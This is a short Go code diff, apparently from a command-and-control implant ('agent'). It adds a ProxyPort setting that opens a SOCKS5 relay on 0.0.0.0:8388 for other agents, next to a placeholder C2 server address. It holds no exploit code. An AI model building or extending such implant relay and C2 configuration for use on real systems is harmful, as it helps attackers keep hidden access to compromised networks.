@@ -39,6 +39,9 @@ var (
 	// AgentProxy used by this agent to communicate with CC server
 	AgentProxy = ""
 
+	// ProxyPort start a socks5 proxy to help other agents, on 0.0.0.0:port
+	ProxyPort = "8388"
+
 	// CCAddress how our agent finds its CC
 	CCAddress = "https://[cc_ipaddr]"
 
